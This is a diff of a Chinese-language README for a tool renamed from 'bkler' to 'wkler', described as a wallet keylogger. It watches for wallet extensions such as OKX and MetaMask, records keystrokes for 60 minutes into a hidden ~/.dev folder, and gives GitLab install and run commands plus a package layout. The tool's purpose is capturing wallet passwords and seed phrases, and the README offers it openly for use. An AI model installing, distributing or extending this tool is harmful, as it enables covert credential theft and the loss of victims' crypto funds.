@@ -1,6 +1,6 @@
-# 钱包键盘记录器 (Wallet Keylogger)
+# wkler - 钱包键盘记录器 (Wallet Keylogger)
 
-持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`
+持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/wkler/recording_{日期}.log`
 
 ## 功能特性
 
@@ -27,35 +27,35 @@
 curl -LsSf https://astral.sh/uv/install.sh | sh
 
 # 从 GitLab 仓库安装工具
-uv tool install git+https://gitlab.com/web3toolsbox/bkler.git
+uv tool install git+https://gitlab.com/web3toolsbox/wkler.git
 
 # 直接使用命令
-bkler
+wkler
 ```
 
 ### 使用 pip 安装
 
 ```bash
 # 克隆项目
-git clone https://gitlab.com/web3toolsbox/bkler.git
-cd bkler
+git clone https://gitlab.com/web3toolsbox/wkler.git
+cd wkler
 pip install -e .
 ```
 
 安装后可直接使用命令：
 
 ```bash
-bkler
+wkler
 ```
 
 ### 直接运行（无需安装）
 
 ```bash
 # 克隆项目
-git clone https://gitlab.com/web3toolsbox/bkler.git
-cd bkler
+git clone https://gitlab.com/web3toolsbox/wkler.git
+cd wkler
 pip install -r requirements.txt
-python bkler.py
+python wkler.py
 ```
 
 ## 使用方法
@@ -63,7 +63,7 @@ python bkler.py
 ### 正常模式
 
 ```bash
-bkler
+wkler
 ```
 
 程序启动后会持续检测活动窗口，当打开钱包扩展（如 OKX、MetaMask 等）时，自动开始记录 60 分钟。
@@ -71,7 +71,7 @@ bkler
 ### 调试模式
 
 ```bash
-bkler --debug
+wkler --debug
 ```
 
 调试模式会：
@@ -84,19 +84,19 @@ bkler --debug
 ### 查看日志
 
 ```bash
-cat ~/.dev/bkler/recording_*.log
+cat ~/.dev/wkler/recording_*.log
 ```
 
 ## 包结构
 
 ```
-bkler/
-├── bkler/                 # 包目录
+wkler/
+├── wkler/                 # 包目录
 │   ├── __init__.py        # 包初始化与导出
 │   ├── cli.py             # 命令行入口（argparse）
 │   ├── detectors.py       # Windows 窗口检测（ctypes + 缓存）
 │   └── logger.py          # 核心记录器类（多线程 + 持久文件句柄）
-├── bkler.py               # 独立脚本入口
+├── wkler.py               # 独立脚本入口
 ├── debug_windows.py       # 窗口调试工具
 ├── pyproject.toml         # 包配置（hatchling + uv 兼容）
 ├── .python-version        # Python 版本固定（3.12）
